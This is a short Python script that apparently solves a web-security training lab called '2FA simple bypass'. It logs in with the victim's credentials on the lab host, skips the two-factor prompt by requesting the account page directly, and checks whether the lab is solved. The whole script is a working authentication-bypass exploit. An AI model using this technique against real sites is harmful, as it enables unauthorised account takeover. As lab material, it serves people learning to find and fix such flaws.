# Lab: 2FA simple bypass

import requests

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080',
           "https": "http://127.0.0.1:8080"
           }


def login1(client):
    host = 'https://0acb00970364d848c06311b500a90093.web-security-academy.net'
    data = {
        'username': 'carlos',
        'password': 'montoya'
    }
    # log in
    client.post(f'{host}/login', data=data, verify=False, proxies=proxies)
    # We are skip 2FA step, and directly request on /my-account
    r = client.get(f'{host}/my-account')
    if 'Your username is: carlos' in r.text:
        print(f'[+] Bypassing 2FA successful')
        if 'Congratulations, you solved the lab!' in r.text:
            print(f'[+] Lab successfully solved')
    else:
        print(f'[-] Bypassing 2FA not successful')


if __name__ == '__main__':
    client = requests.session()
    login1(client)
